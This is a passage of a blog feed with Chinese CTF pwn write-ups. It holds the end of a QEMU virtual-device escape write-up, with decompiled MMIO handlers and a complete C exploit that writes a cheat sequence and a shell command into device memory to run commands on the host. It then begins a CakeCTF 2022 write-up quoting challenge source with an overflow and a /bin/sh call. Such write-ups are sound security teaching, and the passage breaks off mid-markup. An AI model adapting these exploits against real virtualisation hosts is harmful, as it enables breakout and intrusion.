class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># cat /sys/devices/pci0000\\:00/0000:00:04.0/resource</span></span><br><span class=\"line\"><span class=\"number\">0x00000000fb000000</span> <span class=\"number\">0x00000000fbffffff</span> <span class=\"number\">0x0000000000040200</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\">起始地址            终止地址             长度</span><br></pre></td></tr></table></figure>\n<p>注意<br>\n source 是给用户看的 而 resource0~10 之类的是给我们 open 的<br>\n source 就是整合了这些的表格</p>\n<p>从 handler 跟下去<br>\n发现有一处调用了函数数组</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title function_\">sub_571043</span><span class=\"params\">(__int64 a1, __int64 a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v3; <span class=\"comment\">// [rsp+38h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  sub_570742(*(_QWORD *)(a1 + <span class=\"number\">120</span>), <span class=\"number\">1LL</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !(<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)sub_5C950D(a1, <span class=\"number\">0LL</span>, <span class=\"number\">1LL</span>, <span class=\"number\">1LL</span>, <span class=\"number\">0LL</span>, a2) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    sub_570635(a1 + <span class=\"number\">2688</span>, <span class=\"number\">1LL</span>, sub_570A2E, a1);</span><br><span class=\"line\">    sub_843CE1(a1 + <span class=\"number\">2520</span>);</span><br><span class=\"line\">    sub_843FBD(a1 + <span class=\"number\">2576</span>);</span><br><span class=\"line\">    sub_8449B4(a1 + <span class=\"number\">2512</span>, <span class=\"string\">&quot;rfid&quot;</span>, sub_570E7C, a1, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">    sub_31B892(a1 + <span class=\"number\">2272</span>, a1, func_array, a1, <span class=\"string\">&quot;rfid-mmio&quot;</span>, &amp;off_1000000);  [<span class=\"number\">1</span>] &lt;&lt;- vuln</span><br><span class=\"line\">    <span class=\"title function_\">sub_5C1EF2</span><span class=\"params\">(a1, <span class=\"number\">0LL</span>, <span class=\"number\">0LL</span>, a1 + <span class=\"number\">2272</span>)</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>函数数组如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000F</span>E9720 func_array      dq offset vuln          ; DATA XREF: qxl_reset_handler+<span class=\"number\">111</span>↑o</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000F</span>E9728                 dq offset sub_570CEB</span><br></pre></td></tr></table></figure>\n<p>其实这就是个 op 表 里面放的是 read write 之类的<br>\n源码如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">const</span> MemoryRegionOps qxl_io_ops = &#123;</span><br><span class=\"line\">    .read = ioport_read,</span><br><span class=\"line\">    .write = ioport_write,</span><br><span class=\"line\">    .valid = &#123;</span><br><span class=\"line\">        .min_access_size = <span class=\"number\">1</span>,</span><br><span class=\"line\">        .max_access_size = <span class=\"number\">1</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>终于来到了漏洞函数<br>\n只要让这个变量 和他对应的秘籍相同即可</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">vuln</span><span class=\"params\">(__int64 a1, <span class=\"type\">unsigned</span> __int64 a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> v2; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( ((a2 &gt;&gt; <span class=\"number\">20</span>) &amp; <span class=\"number\">0xF</span>) != <span class=\"number\">15</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v2 = <span class=\"built_in\">strlen</span>(cheats);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !<span class=\"built_in\">memcmp</span>(byte_122FFE0, cheats, v2) )</span><br><span class=\"line\">      system(command);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">270438LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>根据这个变量可以往上 xref</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_BYTE *__fastcall <span class=\"title function_\">mmio_write</span><span class=\"params\">(__int64 a1, <span class=\"type\">unsigned</span> __int64 dst, __int64 src, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> num)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _BYTE *result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  _DWORD n[<span class=\"number\">3</span>]; <span class=\"comment\">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v6; <span class=\"comment\">// [rsp+10h] [rbp-30h]</span></span><br><span class=\"line\">  __int64 v7; <span class=\"comment\">// [rsp+18h] [rbp-28h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v8; <span class=\"comment\">// [rsp+2Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+30h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v10; <span class=\"comment\">// [rsp+34h] [rbp-Ch]</span></span><br><span class=\"line\">  __int64 v11; <span class=\"comment\">// [rsp+38h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v7 = a1;</span><br><span class=\"line\">  v6 = dst;</span><br><span class=\"line\">  *(_QWORD *)&amp;n[<span class=\"number\">1</span>] = src;</span><br><span class=\"line\">  v11 = a1;</span><br><span class=\"line\">  v8 = (dst &gt;&gt; <span class=\"number\">20</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">  idx = (dst &gt;&gt; <span class=\"number\">16</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">  result = (_BYTE *)((dst &gt;&gt; <span class=\"number\">20</span>) &amp; <span class=\"number\">0xF</span>);</span><br><span class=\"line\">  <span class=\"keyword\">switch</span> ( (<span class=\"type\">unsigned</span> __int64)result )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">0uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;w&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">1uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;s&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">2uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;a&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">3uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;d&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">4uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;A&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">5uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;B&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">6uLL</span>:</span><br><span class=\"line\">      v10 = (<span class=\"type\">unsigned</span> __int16)v6;</span><br><span class=\"line\">      result = <span class=\"built_in\">memcpy</span>(&amp;command[(<span class=\"type\">unsigned</span> __int16)v6], &amp;n[<span class=\"number\">1</span>], num);</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这正是函数数组的第二个成员</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000F</span>E9720 func_array      dq offset mmio_read     ; DATA XREF: qxl_reset_handler+<span class=\"number\">111</span>↑o</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000F</span>E9728                 dq offset mmio_write</span><br></pre></td></tr></table></figure>\n<p>我们只需要往 cmd 里写入命令<br>\n然后写入秘籍<br>\n read 的时候就能命令执行了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/io.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;inttypes.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;./head.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">uint64_t</span> u64;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> *mmio_mem;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">mmio_read</span><span class=\"params\">(u64 dst)</span>&#123;</span><br><span class=\"line\">  assert(dst + mmio_mem &gt; mmio_mem);</span><br><span class=\"line\">  u64 ret = *((u64 *)(mmio_mem + dst));</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;mmio_read&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// qemu中并没有真的对qemu的的内存读写</span></span><br><span class=\"line\"><span class=\"comment\">// 作为参数传递给qemu的write</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">mmio_write</span><span class=\"params\">(u64 cho, u64 idx, <span class=\"type\">char</span> chr)</span>&#123;</span><br><span class=\"line\">  u64 dst = ((cho &amp; <span class=\"number\">0xf</span>) &lt;&lt; <span class=\"number\">20</span>);</span><br><span class=\"line\">  u64 val = <span class=\"number\">0</span>;</span><br><span class=\"line\">  dst |= ((idx &amp; <span class=\"number\">0xf</span>) &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;dst is %d&quot;</span>, dst);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(cho == <span class=\"number\">6</span>)&#123;</span><br><span class=\"line\">    val = chr;</span><br><span class=\"line\">    dst = idx;</span><br><span class=\"line\">    dst |= ((cho &amp; <span class=\"number\">0xf</span>) &lt;&lt; <span class=\"number\">20</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  *((u64 *)(mmio_mem + dst)) = val;</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;mmio_write&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">write_cheats</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// aWwssadadbaba </span></span><br><span class=\"line\">  mmio_write(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">2</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">2</span>,<span class=\"number\">6</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">3</span>,<span class=\"number\">7</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">5</span>,<span class=\"number\">8</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">4</span>,<span class=\"number\">9</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">5</span>,<span class=\"number\">10</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">4</span>,<span class=\"number\">11</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;write_cheats&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">write_cmd</span><span class=\"params\">(<span class=\"type\">char</span> *cmd)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"built_in\">strlen</span>(cmd); i++)</span><br><span class=\"line\">    mmio_write(<span class=\"number\">6</span>, i, cmd[i]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> mmio_fd = open(</span><br><span class=\"line\">    <span class=\"string\">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,</span><br><span class=\"line\">    O_RDWR | O_SYNC</span><br><span class=\"line\">  );</span><br><span class=\"line\">  mmio_mem = mmap(</span><br><span class=\"line\">    <span class=\"number\">0</span>, <span class=\"number\">0x1000000</span>,</span><br><span class=\"line\">    PROT_WRITE | PROT_READ,</span><br><span class=\"line\">    MAP_SHARED, mmio_fd, <span class=\"number\">0</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(mmio_mem == MAP_FAILED)</span><br><span class=\"line\">    Abort(<span class=\"string\">&quot;mmap&quot;</span>);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;mmio_mem is 0x%lx&quot;</span>, mmio_mem);</span><br><span class=\"line\">  write_cheats();</span><br><span class=\"line\">  write_cmd(<span class=\"string\">&quot;xcalc&quot;</span>);<span class=\"comment\">// gnome-calculator 也行</span></span><br><span class=\"line\">  mmio_read((<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">20</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Linux",
                "virtualization"
            ]
        },
        {
            "id": "https://squirre17.github.io/2022/09/12/2022-cakeCTF-pwn-wp/",
            "url": "https://squirre17.github.io/2022/09/12/2022-cakeCTF-pwn-wp/",
            "title": "2022-cakeCTF-pwn-wp",
            "date_published": "2022-09-12T11:39:37.000Z",
            "content_html": "<p><a href=\"https://2022.cakectf.com/tasks/1538875340/\">CakeCTF 2022</a></p>\n<h1 id=\"welkerme\"><a class=\"markdownIt-Anchor\" href=\"#welkerme\">#</a> welkerme</h1>\n<p>没开 kaslr 没开 smep<br>\n 找到 cc 和 pkc 一把梭了</p>\n<h1 id=\"strvscstr\"><a class=\"markdownIt-Anchor\" href=\"#strvscstr\">#</a> str.vs.cstr</h1>\n<p>c++ 简单溢出<br>\n没开 pie 和 relro</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;array&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Test</span> &#123;</span></span><br><span class=\"line\">\tTest() &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">std</span>::fill(_c_str, _c_str + <span class=\"number\">0x20</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* <span class=\"title function_\">c_str</span><span class=\"params\">()</span> &#123; <span class=\"keyword\">return</span> _c_str; &#125;</span><br><span class=\"line\">\t<span class=\"built_in\">std</span>::<span class=\"built_in\">string</span>&amp; <span class=\"title function_\">str</span><span class=\"params\">()</span> &#123; <span class=\"keyword\">return</span> _str; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">private:</span><br><span class=\"line\">\t__attribute__((used))</span><br><span class=\"line\">\t<span class=\"type\">void</span> <span class=\"title function_\">call_me</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">std</span>::system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span> _c_str[<span class=\"number\">0x20</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">std</span>::<span class=\"built_in\">string</span> _str;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">\tTest test;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">std</span>::setbuf(<span class=\"built_in\">stdin</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">std</span>::setbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;1. set c_str&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span></span><br><span class=\"line\">\t\t\t\t\t\t&lt;&lt; <span class=\"string\">&quot;2. get c_str&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span></span><br><span class=\"line\">\t\t\t\t\t\t&lt;&lt; <span class=\"string\">&quot;3. set str&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span></span><br><span class=\"line\">\t\t\t\t\t\t&lt;&lt; <span class=\"string\">&quot;4. get str&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span>.good()) &#123;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> choice = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;choice: &quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span> &gt;&gt; choice;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">switch</span> (choice) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>: <span class=\"comment\">// set c_str</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;c_str: &quot;</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cin</span> &gt;&gt; test.c_str();</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">2</span>: <span class=\"comment\">// get c_str</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;c_str: &quot;</span> &lt;&lt; test.c_str() &lt;&lt; <span 